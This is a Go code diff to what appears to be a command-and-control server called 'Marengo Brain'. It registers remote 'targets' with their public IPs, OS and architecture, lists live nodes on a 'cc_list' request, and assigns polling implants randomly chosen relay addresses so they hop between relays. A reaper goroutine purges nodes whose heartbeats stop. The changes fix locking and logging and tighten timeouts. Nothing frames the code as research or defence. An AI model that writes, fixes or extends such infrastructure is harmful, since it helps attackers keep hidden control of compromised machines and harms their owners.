@@ -33,7 +33,6 @@ var (
 	lastSeen       = make(map[string]time.Time)
 	trafficCount   = make(map[string]int)
 	publicIPs      = make(map[string]string)
-	sessionStart   = make(map[string]time.Time)
 	nodeOS         = make(map[string]string)
 	nodeArch       = make(map[string]string)
 	eventLog       []string
@@ -45,6 +44,16 @@ const (
 	dbFile      = "infra_db.json"
 	sessionFile = "sessions_db.json"
 )
+
+// --- LOGGING (Safe Version) ---
+// This version doesn't use Mutex, so we only call it while mu is already locked.
+func addLogInternal(msg string) {
+	ts := time.Now().Format("15:04:05")
+	eventLog = append([]string{"[" + ts + "] " + msg}, eventLog...)
+	if len(eventLog) > 20 {
+		eventLog = eventLog[:20]
+	}
+}
 
 // --- PERSISTENCE ---
 func saveState() {
@@ -74,40 +83,40 @@ func loadState() {
 	}
 }
 
+// 2. KEEP THIS ONE (Global version for general use)
 func addLog(msg string) {
 	mu.Lock()
 	defer mu.Unlock()
-	// Get current timestamp
-	ts := time.Now().Format("15:04:05")
-	// Prepend the log so the newest is at the top
-	eventLog = append([]string{"[" + ts + "] " + msg}, eventLog...)
-	// Keep only the last 20 entries to save memory
-	if len(eventLog) > 20 {
-		eventLog = eventLog[:20]
-	}
+	addLogInternal(msg)
 }
 
 func main() {
 	rand.Seed(time.Now().UnixNano())
 	loadState()
 
-	// Global Reaper
+	// --- 1. THE GLOBAL REAPER ---
 	go func() {
 		for {
-			time.Sleep(15 * time.Second)
+			time.Sleep(10 * time.Second)
 			mu.Lock()
+
 			for id, t := range lastSeen {
-				if time.Since(t) > 5*time.Minute {
+				// 60 seconds is the sweet spot for a 10s heartbeat ghost
+				if time.Since(t) > 60*time.Second {
+					addLogInternal("TIMEOUT: Purging node " + id)
 					delete(lastSeen, id)
 					delete(activeTargets, id)
 					delete(publicIPs, id)
+					delete(nodeOS, id)
+					delete(nodeArch, id)
+					delete(activeSessions, id)
 				}
 			}
+
 			for addr, t := range relayPoolMap {
-				if time.Since(t) > 65*time.Second {
+				if time.Since(t) > 45*time.Second {
 					delete(relayPoolMap, addr)
 					delete(relayMetadata, addr)
-					saveState()
 				}
 			}
 			mu.Unlock()
@@ -118,8 +127,11 @@ func main() {
 
 	ln, err := net.Listen("tcp", ":8080")
 	if err != nil {
+		fmt.Println("[!] Listen Error:", err)
 		return
 	}
+
+	fmt.Println("[*] Marengo Brain Online: Port 8080")
 	for {
 		conn, err := ln.Accept()
 		if err != nil {
@@ -138,9 +150,8 @@ func handleConnection(conn net.Conn) {
 	if err := json.NewDecoder(conn).Decode(&req); err != nil {
 		return
 	}
-	id := req.TargetID
 
-	// --- THE GOLDEN RULE: Lock once, Defer unlock once ---
+	id := req.TargetID
 	mu.Lock()
 	defer mu.Unlock()
 
@@ -154,7 +165,7 @@ func handleConnection(conn net.Conn) {
 		if _, exists := relayMetadata[req.Listen]; !exists {
 			relayMetadata[req.Listen] = time.Now()
 		}
-		saveState()
+		go saveState()
 
 	case "client_register":
 		activeTargets[id] = req.Key
@@ -162,13 +173,13 @@ func handleConnection(conn net.Conn) {
 		publicIPs[id] = ip
 		nodeOS[id] = req.OS
 		nodeArch[id] = req.Arch
-		// We use a goroutine for addLog because addLog tries to Lock again!
-		go addLog("REGISTER: " + id + " (" + req.OS + ")")
+		addLogInternal("REGISTER: " + id + " (" + req.OS + ")")
 
 	case "cc_list":
 		t := make([]string, 0)
-		for tid := range lastSeen {
-			if time.Since(lastSeen[tid]) < 300*time.Second {
+		for tid, ts := range lastSeen {
+			// Filter list to only show nodes heartbeated within the last minute
+			if time.Since(ts) < 60*time.Second {
 				t = append(t, tid)
 			}
 		}
@@ -184,27 +195,25 @@ func handleConnection(conn net.Conn) {
 		if len(keys) > 0 {
 			selected := keys[rand.Intn(len(keys))]
 			activeSessions[id] = selected
-			go addLog(fmt.Sprintf("HOP: %s ➔ %s", id, selected))
+			addLogInternal(fmt.Sprintf("HOP: %s ➔ %s", id, selected))
 			json.NewEncoder(conn).Encode(RoutingInfo{RelayAddr: selected})
 		} else {
-			go addLog("ERROR: No relays available for " + id)
+			addLogInternal("ERROR: No relays available for " + id)
 		}
 
 	case "client_poll":
 		lastSeen[id] = time.Now()
 		publicIPs[id] = ip
 		addr, exists := activeSessions[id]
-
 		if exists && addr != "" {
-			publicIPs[id+"_relay"] = addr // Persist for Dashboard
-			delete(activeSessions, id)    // Task delivered
+			publicIPs[id+"_relay"] = addr
+			delete(activeSessions, id)
 			json.NewEncoder(conn).Encode(RoutingInfo{RelayAddr: addr})
 		} else {
 			json.NewEncoder(conn).Encode(RoutingInfo{RelayAddr: ""})
 		}
 	}
 }
-
 func startAnalysisPanel() {
 	// Root Dashboard
 	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
